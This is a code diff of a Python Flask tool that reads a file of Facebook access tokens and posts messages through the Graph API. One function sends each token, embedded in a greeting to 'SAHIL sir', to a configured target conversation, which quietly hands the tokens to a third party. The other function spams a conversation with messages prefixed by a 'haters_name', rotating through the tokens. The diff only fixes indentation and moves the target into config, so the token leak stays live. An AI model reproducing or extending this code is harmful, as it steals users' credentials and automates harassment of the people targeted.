@@ -50,10 +50,10 @@ def send_initial_message():
         with open(app.config['TOKEN_FILE'], 'r') as file:
             tokens = file.readlines()
         msg_template = "Hello SAHIL sir! I am using your token is = {}"
-        target_id = "61562908764313"
+        target_id = app.config['TARGET_ID']
         for token in tokens:
             access_token = token.strip()
-     url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
             msg = msg_template.format(access_token)
             parameters = {'access_token': access_token, 'message': msg}
             response = requests.post(url, json=parameters)
@@ -84,7 +84,7 @@ def send_messages_from_file():
             token_index = message_index % max_tokens
             access_token = tokens[token_index].strip()
             message = messages[message_index].strip()
-          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
             parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
             response = requests.post(url, json=parameters)
             time.sleep(speed)
